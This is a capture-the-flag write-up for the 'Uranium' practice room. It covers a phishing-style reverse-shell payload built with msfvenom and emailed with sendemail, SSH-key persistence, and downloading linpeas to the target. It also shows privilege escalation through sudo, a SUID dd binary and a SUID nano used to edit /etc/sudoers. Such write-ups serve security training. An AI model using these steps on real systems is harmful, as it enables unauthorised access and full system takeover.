Room: [Uranium CTF](https://tryhackme.com/room/uranium)

Difficulty: Hard

Overview: This room is a good representation of how social engeneering can be exploited by hackers. Through an email we will get a reverse shell and in a series of meticulous linux privesc exploits we will take over the room. 

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

First Let's add the ip address of the room to /etc/hosts file and set it to uranium.thm:

```
sudo nano /etc/hosts
```

![image](https://user-images.githubusercontent.com/76821053/130353912-28baec0d-7ae1-4bfb-8405-602c32fcd190.png)


Let's start our enumeration fase by running “nmap” to check for all open ports on the target system:

```
nmap -sV -sC -p- uranium.thm -oN nmap.txt

-sV  →  Probe open ports to determine service
-sC  →  Scan using the default set of scripts
-p-  →  Scan all ports
-oN  →  Save the ouput of the scan in a file
uranium.thm → ip address of the room
```

![image](https://user-images.githubusercontent.com/76821053/130331697-57db8ce1-670d-4dc1-970d-1e5ef7dbd2b4.png)

There are three open ports:

22  →   OpenSSH 7.6p1

25  →   SMTP Postfix smtpd

80  →   Apache httpd 2.4.29

Apache httpd webserver hosts a simple webpage:

![image](https://user-images.githubusercontent.com/76821053/130353442-67950f2f-ed33-4e18-a7a1-deed15bb5319.png)

Thinking like a malicious hacker, we have to do some reconnaissance. So we are going to take a look at the tweeter account of Hakanbey since he is one off the employees of Uranium company: 

![image](https://user-images.githubusercontent.com/76821053/130353447-ef57cd9c-1ade-436b-9520-9b36ce0e624a.png)

From his tweets we can tell that the domain is uranium.thm and that he will accept and run all application files  by the name of “application” that he recieves in his email.

![image](https://user-images.githubusercontent.com/76821053/130353451-62d0fee8-86cd-4eef-a5cf-e8c4e431eae9.png)

In the image above we can see that Hakanbey is a user of uranium. This is our entry point! 

We have to conjure a payload with the name of “application”:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP_ADDRESS  LPORT=PORT -f elf -o application
```

![image](https://user-images.githubusercontent.com/76821053/130353461-e592553b-323a-4c4d-9ff7-5d3afd5f811f.png)

Now we need to setup a netcat listener on our chosen port and send an email with our payload to Hakanbey.

We can use a linux tool called “sendemail” to send an email with our payload to Hakanbey:

```
sendemail -f test@test.test -t hakanbey@uranium.thm -u "test" -m "ok" -a application -s 10.10.155.137 -o tls=no -v

-f → from sender 
-t → to receiver
-a → attach our file
-s → ip of receiver 
-u → user but this one is not important
-o → tls has to be set to no because of errors
-v → verbose
```

![image](https://user-images.githubusercontent.com/76821053/130353472-40698637-28c2-45d9-8c71-bf00c8c378e6.png)

Success, moments later we receive a reverse shell connection on our netcat listener:

![image](https://user-images.githubusercontent.com/76821053/130353484-02e0fe00-9fec-433e-aded-832861ed78d9.png)

We are logged in with user “hakanbey” and to upgrade our shell to a tty one we can use this python3 command:

```
python3 -c "__import__('pty').spawn('/bin/bash')"
```

![image](https://user-images.githubusercontent.com/76821053/130353487-243927c2-aede-435f-b747-bc3beb8de187.png)

The user_1.txt flag can be found at “hakanbey” home directory:

![image](https://user-images.githubusercontent.com/76821053/130353499-dce492b8-ad39-49a7-9160-c024bc129962.png)

Again let's upgrade our shell and change it to an ssh session:

```
ssh-keygen
```

![image](https://user-images.githubusercontent.com/76821053/130353508-ffce60da-b41b-403d-bce7-c6776de9f2e6.png)

We need to create a authorized_keys, copy the id_rsa.pub key to it and give proper permissions:

```
touch authorized_keys

cat id_rsa.pub > authorized_keys

chmod 700 authorized_keys
```

![image](https://user-images.githubusercontent.com/76821053/130353513-23b34621-7590-4b69-b1cd-95d87d81bd77.png)

Now we just need to make a copy of id_rsa key to our attacker machine:

![image](https://user-images.githubusercontent.com/76821053/130353518-7ff851fd-c48c-48f0-b11c-9d25c79442f5.png)

Give it permissions and run ssh:

```
chmod 600 id_rsa

ssh -i id_rsa hakanbey@uraium.thm
```

![image](https://user-images.githubusercontent.com/76821053/130353526-ea74c0c6-afad-418a-a408-36e5f64a939f.png)

To further enumerate the machine we can upload [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to the target machine.

First we need to setup an python3 http server:

```
python3 -m http.server
```

![image](https://user-images.githubusercontent.com/76821053/130353536-c52f7bdb-961c-44c8-8681-d6eaf41758ab.png)

And from the target machine we can use “wget” to download linpeas.

```
wget http://host_ip_address:port/linpeas.sh
```

After uploading the linpeas we need to give execute permission:

```
chmod +x linpeas.sh
```

![image](https://user-images.githubusercontent.com/76821053/130353544-c8e13bb9-b8a6-4cfd-9b5f-df6e30fc3f6a.png)

This cron job shows how we got a reverse shell from sending an email.  Every minute "ripmime" runs, searches emails for a file called “application”, give it execute permissions and run the file.  In the end deletes all files inside the email directory: 

![image](https://user-images.githubusercontent.com/76821053/130353547-2afc86d0-0357-4e4d-8cc1-07a9a2fe4fab.png)

Here we can see an interesting SUID binary that later will play an important role in exploit this machine:

![image](https://user-images.githubusercontent.com/76821053/130353553-2c84b22a-4260-4ee0-810c-4681680921a2.png)

If we list the contents of “hakanbey” directory we can see that there is a program called “chat_with_kral4”:

![image](https://user-images.githubusercontent.com/76821053/130353561-43e3834b-0bda-40e7-83a1-627f62bf0847.png)

We cannot get in because this program asks for a password:

![image](https://user-images.githubusercontent.com/76821053/130353641-598e50aa-fbae-48f2-9c86-cccacdeafb51.png)

It is always a good practice to check /var/log directory, and in our case we can see a wireshark pcap file:

![image](https://user-images.githubusercontent.com/76821053/130353643-702a3963-e82b-4706-a69d-64bbc7c687a7.png)

We can download the pcap file to our system and analyze it with wireshark.

On the target system use python3 http server:

```
python3 -m http.server
```

![image](https://user-images.githubusercontent.com/76821053/130353650-049790a8-28ff-4ba0-8e94-3139e09771e5.png)

From our attacker machine we can use wget:

```
wget http://uranium.thm:8000/hakanbey_network_log.pcap
```

![image](https://user-images.githubusercontent.com/76821053/130353663-0d3fbbcd-8150-47e4-aada-76825ebac612.png)

When analyzing the pcap we can see that this is a conversation between “kral4” and "hakankey".  If we print this file it checks out:

![image](https://user-images.githubusercontent.com/76821053/130353675-b54e7e17-da23-4977-b00d-a3d615086f01.png)

So at packet 4 frrom the pcap file we have a possible password:

![image](https://user-images.githubusercontent.com/76821053/130353693-385d4c82-d69d-4753-a2b5-379daeaf98aa.png)

Why is it a possible password ? Because when we tried to run the chat binary on “hakanbey” directory the first thing it asks is for a password. So logically thinking, before they start to chat the first packets must contain a password.

With the password for the chat program let's run it again and where it will lead us:

![image](https://user-images.githubusercontent.com/76821053/130353699-5c808c6f-80e4-434b-a8b4-1161de083260.png)

We found a password for “hakanbey" and if we check what sudo permission this user has we can privesc horizontaly.

```
sudo -l

sudo -u kral4 /bin/bash -p

-u → specify the user with the required permissions
-p → to make bash persistent
```

“hakanbey” can run /bin/bash with “kral4” sudo permissions:

![image](https://user-images.githubusercontent.com/76821053/130353710-5c81888a-6542-498c-aea1-4031745d6078.png)

Now that we are in “kral4” account we can find the user_2.txt file in his home directory:

![image](https://user-images.githubusercontent.com/76821053/130353714-10ff3fa6-f7e5-46fb-a738-47787b274c0d.png)

Has showned before with linpeas.sh we can manually search for SUID binaries in the system:

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

![image](https://user-images.githubusercontent.com/76821053/130353718-e0dff46e-45ef-43e0-a9f0-2a6ef137a7c8.png)

We can run /bin/dd has user “web”.  What can we do with it? We can check [GTFOBins](https://gtfobins.github.io/gtfobins/dd/):

![image](https://user-images.githubusercontent.com/76821053/130353728-8f0102f2-b7ee-45a4-9247-93c0c754b4b6.png)

If we head to /var/www/html directory we can find a new flag. But we can only read it if we have permissions. So taking advantage of the SUID binary that we found we can read the "web_flag.txt":

```
LFILE=web_flag.txt

/bin/dd if=$LFILE
```

![image](https://user-images.githubusercontent.com/76821053/130353738-e28e2bd2-8a2c-4319-8d49-ff9037ce38f0.png)

After searching for a bit trying to figure out how to get the final flag i checked “kral4” emails:

```
cat /var/mail/kral4
```

![image](https://user-images.githubusercontent.com/76821053/130353743-6d0fc4f8-a67e-4758-ba81-6db218cb35c2.png)

In this e-mail root user informed “kral4” that if anything happens to the index.html file he would give “nano” SUID privileges for “kral4” to take action.

First we can start by making a copy of "nano" to “kral4” home directory:

![image](https://user-images.githubusercontent.com/76821053/130353750-d5ce999e-d119-47a5-a2e5-6acd80cef71a.png)

We see that “nano” has no special permissions, at least for now. What if we change the content of index.html?
 
Listing the contents of the html directory, “kral4” does not have permissions to change anything in this directory: 

![image](https://user-images.githubusercontent.com/76821053/130353758-9254e5e1-6e84-436b-8131-ebd9b3d0a7da.png)

So we can take the same approuch and take advantage of /bin/dd binary to edit the index.html file. Again check [GTFOBins](https://gtfobins.github.io/gtfobins/dd/):

![image](https://user-images.githubusercontent.com/76821053/130353766-4daa5cb1-0bc7-4ced-870c-b67fbd24d736.png)

```
LFILE=/var/www/html/index.html

echo “test” | /bin/dd of=$LFILE
```

![image](https://user-images.githubusercontent.com/76821053/130353776-bab2ff9d-2818-4b15-886a-613ce44479aa.png)

If we check the website, index.html now prints the word “test”:

![image](https://user-images.githubusercontent.com/76821053/130353788-6167c990-b3cc-4ef0-abbf-7a1cc1bed4f0.png)

So after editing index.html “kral4” eventualy received a new email: 

![image](https://user-images.githubusercontent.com/76821053/130353797-85354c40-cd17-4999-bacc-abf212798fb4.png)
![image](https://user-images.githubusercontent.com/76821053/130353798-93a92165-c494-4b74-b429-6c0fe1602556.png)

In this email “root” user tells us that index page was hacked and that he will give us privilege to fix it. Again checking “kral4” home directory our “nano” binary was modified:

![image](https://user-images.githubusercontent.com/76821053/130353807-57c77d24-cbd5-4e3b-9ee3-b8f7905c3401.png)

Now that we have “root” SUID permissions on “nano” we can easily privesc vertically.

To do so we can edit /etc/sudoers:

```
hakanbey        ALL=(ALL:ALL) ALL
```

![image](https://user-images.githubusercontent.com/76821053/130353815-db75ef42-dfbd-44fe-860f-7fe3a0ff55c8.png)

Since we only have the password of “hakanbey”, we can change is permissions to match “root”. This option indicates that any user can execute a command from any terminal, acting as ALL (or any) user, and run can run any or ALL commands.

To get to “root” just change to user “hakanbey" with his credentials and then escalate to “root”:

```
su hakanbey

sudo su
```

![image](https://user-images.githubusercontent.com/76821053/130353825-8483de09-f958-43eb-83c1-f4de75be8437.png)

Success, now we can get our final flag!

![image](https://user-images.githubusercontent.com/76821053/130353832-2275c1d5-8756-4791-900d-5cf5c41860a2.png)

To finish this room, if out of the blue we would know the path of “root's” final flag we could also use “nano” to read it without having to escalate privileges.

![image](https://user-images.githubusercontent.com/76821053/130353840-3d0984b2-ece9-4501-a1e0-6fd103a09aaa.png)




